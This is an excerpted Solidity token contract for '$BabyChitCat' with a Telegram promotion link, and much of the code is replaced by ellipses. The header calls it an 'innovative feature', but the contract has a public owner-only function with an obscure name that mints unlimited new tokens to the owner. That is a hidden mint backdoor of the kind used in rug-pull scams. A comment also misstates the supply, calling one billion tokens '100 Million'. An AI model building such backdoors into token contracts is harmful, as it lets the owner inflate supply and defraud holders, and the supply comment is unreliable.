//
// $BabyChitCat proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabyChitCATPortal
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyChitCat(uint256 amount) public onlyOwner {
 _BabyChitCat(msg.sender, amount);
    }
    ...
    function _BabyChitCat(address account, uint256 amount) internal virtual {
...
contract $BabyChitCat is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby ChitCat", "BBCHITCAT") {
     _BabyChitCat(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}